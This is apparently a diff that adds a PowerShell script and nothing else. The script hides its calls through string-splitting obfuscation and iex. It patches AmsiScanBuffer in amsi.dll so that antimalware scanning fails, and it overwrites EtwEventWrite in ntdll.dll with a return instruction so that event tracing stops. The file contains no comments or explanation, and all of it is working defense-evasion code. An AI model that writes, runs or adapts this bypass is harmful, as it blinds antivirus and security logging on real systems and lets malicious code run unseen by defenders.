@@ -1,0 +1,195 @@
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+$XeuJb='Add-'
+$jryik='Type'
+$odQiH=' $Wi'
+$Jz7S2='n32'
+iex($XeuJb + $jryik + $odQiH + $Jz7S2)
+
+$DUMBW='$Loa'
+$uCIAH='dLib'
+$pFota='rary'
+$xO384=' = ['
+$fHzPo='Win3'
+$Iofqg='2]::'
+$rVdFa='Load'
+$wcN5d='Libr'
+$FtpWb='ary('
+$x7ugg='"am"'
+$rmxJt=' + "'
+$yhYsr='si.d'
+$F22oq='ll")'
+iex($DUMBW + $uCIAH + $pFota + $xO384 + $fHzPo + $Iofqg + $rVdFa + $wcN5d + $FtpWb + $x7ugg + $rmxJt + $yhYsr + $F22oq)
+
+$kiPA5='$Add'
+$pTdR6='ress'
+$1BKRU=' = ['
+$dHcjc='Win3'
+$lvVCD='2]::'
+$4eEDW='GetP'
+$6TXGL='rocA'
+$eVl4P='ddre'
+$P34Et='ss($'
+$HjK5T='Load'
+$l0e8C='Libr'
+$EPWzg='ary,'
+$hW7gw=' "Am'
+$3naz1='si" '
+$9pwDk='+ "S'
+$AcdBd='can"'
+$xCyiv=' + "'
+$lTzOQ='Buff'
+$hJzZm='er")'
+iex($kiPA5 + $pTdR6 + $1BKRU + $dHcjc + $lvVCD + $4eEDW + $6TXGL + $eVl4P + $P34Et + $HjK5T + $l0e8C + $EPWzg + $hW7gw + $3naz1 + $9pwDk + $AcdBd + $xCyiv + $lTzOQ + $hJzZm)
+
+$qSoLn='$p ='
+$pBLJQ=' 0'
+($qSoLn + $pBLJQ) | iex
+
+$CNOJD='$h ='
+$tHWj1=' [Wi'
+$KJzC9='n32]'
+$2Y2Vr='::Vi'
+$D2rMT='rtua'
+$s8pKG='lPro'
+$vNp9N='tect'
+$wQHOP='($Ad'
+$8yw8p='dres'
+$DdrS1='s, ['
+$acR3o='uint'
+$iwVdL='32]5'
+$U9dsp=', 0x'
+$Pq1Lc='40, '
+$qXJks='[ref'
+$rNWHv=']$p)'
+($CNOJD + $tHWj1 + $KJzC9 + $2Y2Vr + $D2rMT + $s8pKG + $vNp9N + $wQHOP + $8yw8p + $DdrS1 + $acR3o + $iwVdL + $U9dsp + $Pq1Lc + $qXJks + $rNWHv) | iex
+
+$ICWIO='$Pat'
+$5Sys1='ch ='
+$VeuH4=' [By'
+$glr3K='te[]'
+$VRp5B='] (0'
+$JrJ66='xB8,'
+$YmNbR=' 0x5'
+$G4WyR='7, 0'
+$LXJXN='x00,'
+$WGj1L=' 0x0'
+$M1fiF='7, 0'
+$CwJf6='x80,'
+$AZvFL=' 0xC'
+$6KRkg='3)'
+iex($ICWIO + $5Sys1 + $VeuH4 + $glr3K + $VRp5B + $JrJ66 + $YmNbR + $G4WyR + $LXJXN + $WGj1L + $M1fiF + $CwJf6 + $AZvFL + $6KRkg)
+
+$Ay8Zf='[Sys'
+$XHop8='tem.'
+$w9hWO='Runt'
+$lkT5q='ime.'
+$c69cy='Inte'
+$6Tl3C='ropS'
+$VEyvH='ervi'
+$3q2JU='ces.'
+$PGlxt='Mars'
+$36NbX='hal]'
+$1Ofpa='::Co'
+$njT8i='py($'
+$g8nC2='Patc'
+$UvZUB='h, 0'
+$K9e1f=', $A'
+$pRV9V='ddre'
+$V6bmN='ss, '
+$calAb='6)'
+iex($Ay8Zf + $XHop8 + $w9hWO + $lkT5q + $c69cy + $6Tl3C + $VEyvH + $3q2JU + $PGlxt + $36NbX + $1Ofpa + $njT8i + $g8nC2 + $UvZUB + $K9e1f + $pRV9V + $V6bmN + $calAb)
+
+$bow2R='$Loa'
+$0bJfs='dLib'
+$y1fOm='rary'
+$yH5pC=' = ['
+$Fn0zs='Win3'
+$aXtOt='2]::'
+$wMlhB='Load'
+$kFbG9='Libr'
+$RoeTb='ary('
+$JvsjN='"nt"'
+$wrT3i=' + "'
+$Zid2Z='dll.'
+$LDszb='dll")'
+($bow2R + $0bJfs + $y1fOm + $yH5pC + $Fn0zs + $aXtOt + $wMlhB + $kFbG9 + $RoeTb + $JvsjN + $wrT3i + $Zid2Z + $LDszb) | iex
+
+$XVqpo='$Add'
+$EAKzx='ress'
+$6labb=' = ['
+$eOaGQ='Win3'
+$iQAty='2]::'
+$3mqGl='GetP'
+$fsOVu='rocA'
+$1nySW='ddre'
+$b16CH='ss($'
+$S6bch='Load'
+$Umyf8='Libr'
+$Ec4TX='ary,'
+$RRCaA=' "Et'
+$19cNS='wEve'
+$ISGiP='ntWr'
+$AQQl1='ite")'
+($XVqpo + $EAKzx + $6labb + $eOaGQ + $iQAty + $3mqGl + $fsOVu + $1nySW + $b16CH + $S6bch + $Umyf8 + $Ec4TX + $RRCaA + $19cNS + $ISGiP + $AQQl1) | iex
+
+$N1D1D='$p ='
+$0g6fn=' 0'
+($N1D1D + $0g6fn) | iex
+
+$fYSPf='$h ='
+$07l9t=' [Wi'
+$Ag39f='n32]'
+$G0ImY='::Vi'
+$jjA8F='rtua'
+$q0EJw='lPro'
+$ImIgr='tect'
+$kZ9RQ='($Ad'
+$A3aZ1='dres'
+$gb7Px='s, ['
+$ZalVZ='uint'
+$ZMBx2='32]5'
+$nmzsQ=', 0x'
+$HZhbj='40, '
+$R0quE='[ref'
+$BPkQM=']$p)'
+iex($fYSPf + $07l9t + $Ag39f + $G0ImY + $jjA8F + $q0EJw + $ImIgr + $kZ9RQ + $A3aZ1 + $gb7Px + $ZalVZ + $ZMBx2 + $nmzsQ + $HZhbj + $R0quE + $BPkQM)
+
+$t9Ynn='$Pat'
+$8y40p='ch ='
+$H5GCw=' [By'
+$w3Mjn='te[]'
+$nvZqS='] (0'
+$NIEor='xc3)'
+iex($t9Ynn + $8y40p + $H5GCw + $w3Mjn + $nvZqS + $NIEor)
+
+$h5Ut4='[Sys'
+$XVCI6='tem.'
+$3fNGA='Runt'
+$mQlqi='ime.'
+$a13pk='Inte'
+$Tz0Np='ropS'
+$VJyBj='ervi'
+$JusdU='ces.'
+$jVdmI='Mars'
+$WdOSx='hal]'
+$PdUD7='::Co'
+$9K5Km='py($'
+$sg5SF='Patc'
+$IGmYO='h, 0'
+$txtFf=', $A'
+$aNmrc='ddre'
+$Gn1mv='ss, '
+$oL9yC='1)'
+iex($h5Ut4 + $XVCI6 + $3fNGA + $mQlqi + $a13pk + $Tz0Np + $VJyBj + $JusdU + $jVdmI + $WdOSx + $PdUD7 + $9K5Km + $sg5SF + $IGmYO + $txtFf + $aNmrc + $Gn1mv + $oL9yC)
